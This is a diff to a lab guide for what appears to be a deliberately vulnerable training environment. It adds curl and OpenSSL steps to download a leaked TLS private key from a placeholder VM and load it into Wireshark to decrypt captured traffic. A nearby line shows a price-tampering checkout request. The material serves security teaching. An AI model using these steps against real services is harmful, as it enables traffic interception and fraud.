@@ -100,6 +100,22 @@ curl -X POST http://<UBUNTU_VM_IP>:8084/checkout \
      -d "product_id=1&price=0.01&coupon=DISCOUNT20"
 ```
 
+### F. SSL/TLS Certificate Analysis & Private Key Decryption - Wave Chat (`:8086`)
+Analyze certificates and exploit weak Let's Encrypt staging certificates:
+```bash
+# 1. Fetch active SSL/TLS certificate details via REST API
+curl -s http://<UBUNTU_VM_IP>:8086/api/v1/certificate
+
+# 2. Inspect certificate PEM file using OpenSSL in Kali
+curl -s http://<UBUNTU_VM_IP>:8086/certificate/download/cert.pem -o cert.pem
+openssl x509 -in cert.pem -text -noout
+
+# 3. Download leaked private key in weak/beginner mode
+curl -s http://<UBUNTU_VM_IP>:8086/certificate/download/key.pem -o key.pem
+
+# 4. Import key.pem into Wireshark (Preferences -> Protocols -> TLS -> RSA Keys List) to decrypt PCAP traffic
+```
+
 ---
 
 ## 🚀 Microservices Quickstart Summary
